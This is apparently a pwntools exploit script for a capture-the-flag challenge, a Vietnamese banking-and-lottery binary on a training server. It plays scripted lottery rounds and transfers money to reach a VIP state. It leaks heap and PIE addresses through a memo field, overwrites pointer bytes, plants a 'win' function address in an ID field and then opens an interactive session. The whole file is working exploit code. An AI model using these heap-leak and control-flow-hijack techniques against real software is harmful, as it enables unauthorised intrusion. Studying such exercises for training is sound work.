#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'chall_patched'
HOST = 'pwn-bk88.training.bksec.vn'
PORT = 8443

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x295A
brva 0x157A
brva 0x15E9
brva 0x2909
brva 0x1AEE
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
'''
vip condition:
+ money > 2000000
+ transaction count >= 19
- borrow money from nha cai
- danh de x1
round1 = [19, 11, 18, 7, 36, 9, 1]
round2 = [10, 1, 30, 24, 2, 15, 26]
round3 = [19, 8, 26, 25, 11, 2, 27]
round4 = [2, 23, 16, 37, 5, 13, 15]
round5 = [24, 11, 31, 13, 35, 21, 14]
round6 = [12, 24, 3, 23, 20, 18, 30]
round7 = [1, 7, 37, 15, 34, 2, 26]
round8 = [5, 4, 13, 22, 28, 37, 11]
round9 = [18, 24, 20, 21, 1, 7, 8]
round10 = [10, 9, 23, 2, 24, 15, 32]
round11 = [20, 3, 13, 18, 30, 27, 34]

- transfer money from main acc to debt acc x18
- danh de x1
- create_transaction_record(): cccd = amount
'''

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# register
sla(b'Lua chon : ', b'6')
sla(b'ID : ', b'0')
sla(b'Password : ', b'1234')
# login
sla(b'Lua chon : ', b'7')
sla(b'ID : ', b'0')
sla(b'Password : ', b'1234')
# vay no
sla(b'Lua chon : ', b'4')
# danh de
sla(b'Lua chon : ', b'5')

round1 = [19, 11, 18, 7, 36, 9, 1]

for i in range(7):
    sla(b'] : ', str(round1[i]).encode())
sla(b'Name : \n', b'HELLO')
sla(b'CCCD : \n', b'123456789')
# read acc
sla(b'Lua chon : ', b'1')
p.recvuntil(b'number : ')
main_acc = p.recv(9)
p.recvuntil(b'number : ')
acc_vay_no = p.recv(9)
# transfer money
for i in range(18):
    sla(b'Lua chon : ', b'3')
    sla(b'nguoi nhan\n', acc_vay_no)
    sla(b'so tien\n', b'10')
# tiep tuc danh de
sla(b'Lua chon : ', b'5')

round2 = [10, 1, 30, 24, 2, 15, 26]

for i in range(7):
    sla(b'] : ', str(round2[i]).encode())
sla(b'Name : \n', b'HELLO')
sla(b'CCCD : \n', b'123456789')

# leak heap via nguoi dung
sla(b'Lua chon : ', b'7')
sla(b'Input : ', b'1')
p.recvuntil(b'Memo : ')
leak = p.recvline()[:-1]
heap_leak = u64(leak.ljust(8, b'\x00'))
heap_base = heap_leak - 0x720
log.info(f'leak = {hex(heap_leak)}')
log.info(f'heap_base = {hex(heap_base)}')
'''
# leak pie
vip_func = heap_base + 0x702
sla(b'Input : ', b'2')
sla(b'Edit\n', p64(vip_func))
sla(b'Input : ', b'1')
p.recvuntil(b'Memo : ')
leak = p.recvline()[:-1]
pie_leak = u64(leak.ljust(8, b'\x00'))
log.info(f'leak = {hex(pie_leak)}')
'''
sla(b'Input : ', b'0')

# danh de lan 3
# danh de x6
round3 = [19, 8, 26, 25, 11, 2, 27]
round4 = [2, 23, 16, 37, 5, 13, 15]
round5 = [24, 11, 31, 13, 35, 21, 14]
round6 = [12, 24, 3, 23, 20, 18, 30]
round7 = [1, 7, 37, 15, 34, 2, 26]
round8 = [5, 4, 13, 22, 28, 37, 11]
round9 = [18, 24, 20, 21, 1, 7, 8]
round10 = [10, 9, 23, 2, 24, 15, 32]
round11 = [20, 3, 13, 18, 30, 27, 34]
list = [round3, round4, round5, round6, round7, round8]
for i in range(len(list)):
    sla(b'Lua chon : ', b'5')
    for j in range(7):
        sla(b'] : ', str(list[i][j]).encode())
    sla(b'Name : \n', b'HELLO')
    sla(b'CCCD : \n', b'123456789')
# edit memo to overwrite last 2 bytes in memo
sla(b'Lua chon : ', b'7')
sla(b'Input : ', b'2')
# c7e0 -> c700
begin = 0x720 + heap_base
last_2_bytes = (begin + 0x80) & 0xff00

payload = flat(
    begin,
    begin+0x20,
    begin+0x40,
    begin+0x60
)

sa(b'Edit\n', payload + p16(last_2_bytes))
sla(b'Input : ', b'0')
# leak vip func
sla(b'Lua chon : ', b'2')
p.recvuntil(b'To : 0')
p.recvuntil(b'So du : ')
leak = p.recvline().strip()
vip_leak = int(leak)
pie_base = vip_leak - 0x1AEE
win = pie_base + 0x13A9
log.info(f'pie_leak = {hex(vip_leak)}')

# cccd = dia chi win
sla(b'Lua chon : ', b'5')
for j in range(7):
    sla(b'] : ', str(round9[j]).encode())
sla(b'Name : \n', b'HELLO')
sla(b'CCCD : \n', str(win).encode())

# run vip func
sla(b'Lua chon : ', b'8')

p.interactive()
